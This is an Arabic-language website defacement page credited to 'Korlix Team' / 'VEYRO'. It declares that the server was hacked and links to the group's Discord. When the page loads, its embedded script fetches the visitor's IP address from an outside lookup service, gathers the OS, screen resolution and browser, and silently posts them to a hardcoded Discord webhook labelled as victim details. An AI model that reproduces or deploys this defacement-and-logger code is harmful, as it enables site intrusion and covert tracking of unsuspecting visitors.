<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Korlix Team // CODED BY VEYRO</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@500;700;900&family=Share+Tech+Mono&display=swap');

    * { margin: 0; padding: 0; box-sizing: border-box; }
    
    body { 
      background: #050505; 
      color: #b0b0b0; 
      font-family: 'Share Tech Mono', 'Tajawal', monospace; 
      overflow-x: hidden;
      min-height: 100vh;
    }

    #bg-canvas {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: -1;
      opacity: 0.12;
    }

    #main-content { 
      display: flex; 
      flex-direction: column; 
      align-items: center; 
      justify-content: center; 
      min-height: 100vh; 
      text-align: center;
      z-index: 10;
      position: relative;
      padding: 30px 20px;
    }

    #media-container {
      width: 100%; 
      max-width: 560px; 
      border-radius: 12px;
      box-shadow: 0 0 50px rgba(0, 0, 0, 0.9), inset 0 0 20px rgba(50, 50, 50, 0.3); 
      border: 1px solid #262626; 
      overflow: hidden; 
      margin-bottom: 25px;
      background: #000;
      position: relative;
    }

    .terminal-bar {
      background: #0f0f0f;
      padding: 8px 15px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      border-bottom: 1px solid #222;
      font-size: 0.75rem;
      color: #777;
      letter-spacing: 2px;
    }

    .terminal-dots span {
      display: inline-block;
      width: 8px; height: 8px;
      background: #444;
      border-radius: 50%;
      margin-left: 5px;
    }

    #media-container img { 
      width: 100%; 
      display: block; 
      filter: grayscale(100%) contrast(140%) brightness(80%);
    }

    .hacked-text { 
      font-family: 'Tajawal', sans-serif;
      font-size: 2.1rem; 
      font-weight: 900; 
      margin-bottom: 25px;
      color: #e6e6e6;
      text-shadow: 0 0 20px rgba(255, 255, 255, 0.15), 0 0 40px rgba(0, 0, 0, 0.8);
      animation: smoothSlide 3s ease-in-out infinite alternate;
      letter-spacing: 1px;
    }

    @keyframes smoothSlide { 
      0% { transform: translateY(-4px); opacity: 0.7; text-shadow: 0 0 10px rgba(255,255,255,0.1); } 
      100% { transform: translateY(4px); opacity: 1; text-shadow: 0 0 25px rgba(255,255,255,0.3), 0 0 50px rgba(0,0,0,0.9); } 
    }

    #info-block { 
      text-align: left; 
      font-size: 0.95rem; 
      line-height: 1.9rem; 
      color: #9e9e9e; 
      background: rgba(10, 10, 10, 0.95);
      backdrop-filter: blur(15px);
      padding: 25px 30px;
      border-radius: 12px;
      border: 1px solid #222;
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.95), inset 0 0 15px rgba(255, 255, 255, 0.02);
      width: 90%;
      max-width: 560px;
    }

    #info-block span { 
      display: block; 
      border-bottom: 1px dashed #1c1c1c; 
      margin-bottom: 8px; 
      padding-bottom: 6px; 
    }

    .discord-btn {
      display: block;
      width: 100%;
      margin-top: 22px;
      padding: 14px;
      background: #121212;
      border: 1.5px solid #333;
      color: #e6e6e6;
      text-decoration: none;
      border-radius: 8px;
      font-family: 'Tajawal', sans-serif;
      font-weight: 700;
      font-size: 1.15rem;
      letter-spacing: 1px;
      text-align: center;
      transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.8);
    }

    .discord-btn:hover {
      background: #e6e6e6;
      color: #050505;
      border-color: #e6e6e6;
      box-shadow: 0 0 30px rgba(255, 255, 255, 0.25);
      transform: translateY(-3px);
    }

    .corner-signature {
      position: fixed;
      bottom: 15px;
      right: 20px;
      font-size: 0.8rem;
      color: #666;
      letter-spacing: 2px;
      z-index: 999;
      background: rgba(0, 0, 0, 0.6);
      padding: 5px 10px;
      border-radius: 4px;
      border: 1px solid #1a1a1a;
    }

    @media (max-width: 600px) { 
      .hacked-text { font-size: 1.3rem; } 
      #info-block { font-size: 0.85rem; padding: 18px; }
      .corner-signature { font-size: 0.7rem; right: 10px; bottom: 10px; }
    }
  </style>
</head>
<body>

  <canvas id="bg-canvas"></canvas>

  <div id="main-content">
    <div id="media-container">
      <div class="terminal-bar">
        <span>Korlix Team // CODED BY VEYRO</span>
        <div class="terminal-dots">
          <span></span><span></span><span></span>
        </div>
      </div>
      <img src="https://media.tenor.com/tbCuJhOJUW4AAAAM/im-cyn-scary.gif" alt="Hacking Animation">
    </div>

    <div class="hacked-text">لقد تم اختراق السيرفر بنجاح من قبل Team Korlix !!</div>
    
    <div id="info-block">
      <span id="ip">[-] Target IP: Scanning...</span>
      <span id="location">[-] Geo-Location: Tracing...</span>
      <span id="isp">[-] Network Provider: Analyzing...</span>
      <span id="os">[-] Target OS: Detecting...</span>
      <span id="screen">[-] Resolution: Extracting...</span>
      <span id="browser">[-] Client Fingerprint: Identifying...</span>
      
      <a href="https://discord.gg/PShWngtVB" target="_blank" class="discord-btn">JOIN KORLIX DISCORD</a>
    </div>
  </div>

  <div class="corner-signature">VEYRO</div>

  <audio id="bg-audio" loop autoplay>
    <source src="https://bulleti.lol/uploads/04mdkFksditf/TANIN.mp3" type="audio/mpeg">
  </audio>

  <script>
    window.addEventListener('click', () => {
      const audio = document.getElementById('bg-audio');
      if (audio.paused) {
        audio.play().catch(()=>{});
      }
    }, { once: true });

    (function() {
      const canvas = document.getElementById('bg-canvas');
      const ctx = canvas.getContext('2d');
      function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
      window.addEventListener('resize', resize); resize();

      const chars = "0101010101XYZ//DARK_MATRIX_SYSTEM"; 
      const fontSize = 13;
      let drops = Array(Math.floor(canvas.width / fontSize)).fill(1);
      function draw() {
        ctx.fillStyle = "rgba(5, 5, 5, 0.18)";
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = "#555555"; 
        ctx.font = fontSize + "px 'Share Tech Mono', monospace";
        drops.forEach((y, i) => {
          ctx.fillText(chars[Math.floor(Math.random() * chars.length)], i * fontSize, y * fontSize);
          if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
          drops[i]++;
        });
      }
      setInterval(draw, 50);

      function getBrowserInfo() {
        const ua = navigator.userAgent;
        if (ua.indexOf("Edg") > -1) return "Microsoft Edge";
        if (ua.indexOf("Chrome") > -1) return "Google Chrome";
        if (ua.indexOf("Firefox") > -1) return "Mozilla Firefox";
        if (ua.indexOf("Safari") > -1) return "Apple Safari";
        return "Unknown";
      }

      async function sendToDiscord(ipData, osData, screenData, browserData) {
        const webhookUrl = "https://discord.com/api/webhooks/1541910626459193425/tbUw-PaBHYNqbdAecYPhDOPFqHmbZtrJTvUFTZQhyWUtYfzgqj65r5xaNB7ZXU3LHOL0";
        
        const payload = {
          content: "@everyone **🚨 زائر جديد دخل الصفحة!**",
          embeds: [{
            title: "🔍 تفاصيل الضحية / الزائر",
            color: 16711680,
            fields: [
              { name: "🌐 عنوان الـ IP", value: "`" + ipData + "`", inline: true },
              { name: "💻 نظام التشغيل", value: "`" + osData + "`", inline: true },
              { name: "🖥️ دقة الشاشة", value: "`" + screenData + "`", inline: true },
              { name: "🧭 المتصفح", value: "`" + browserData + "`", inline: true }
            ],
            footer: { text: "VEYRO // Korlix Team Logger" },
            timestamp: new Date().toISOString()
          }]
        };

        try {
          await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });
        } catch (err) {
          console.error("Webhook Error");
        }
      }

      async function initData() {
        const osVal = navigator.platform || "Desktop Environment";
        const screenVal = window.screen.width + "x" + window.screen.height + " px";
        const browserVal = getBrowserInfo();

        document.getElementById('os').textContent = "[+] Target OS: " + osVal;
        document.getElementById('screen').textContent = "[+] Resolution: " + screenVal;
        document.getElementById('browser').textContent = "[+] Client Fingerprint: " + browserVal;
        
        let ipVal = "127.0.0.1";
        try {
          const res = await fetch('https://api.ipify.org?format=json');
          const d = await res.json();
          ipVal = d.ip || "127.0.0.1";
        } catch (e) {
          try {
            const fallbackRes = await fetch('https://ident.me/.json');
            const fallbackD = await fallbackRes.json();
            ipVal = fallbackD.ip || fallbackD;
          } catch (err) {
            ipVal = "Unknown IP";
          }
        }

        document.getElementById('ip').textContent = "[+] Target IP: " + ipVal;
        document.getElementById('location').textContent = "[+] Geo-Location: Global Node";
        document.getElementById('isp').textContent = "[+] Network Provider: Active Trace";

        // إرسال البيانات فوراً إلى الويب هوك الخاص بك
        sendToDiscord(ipVal, osVal, screenVal, browserVal);
      }

      initData();
      document.addEventListener('contextmenu', e => e.preventDefault());
    })();
  </script>
</body>
</html>
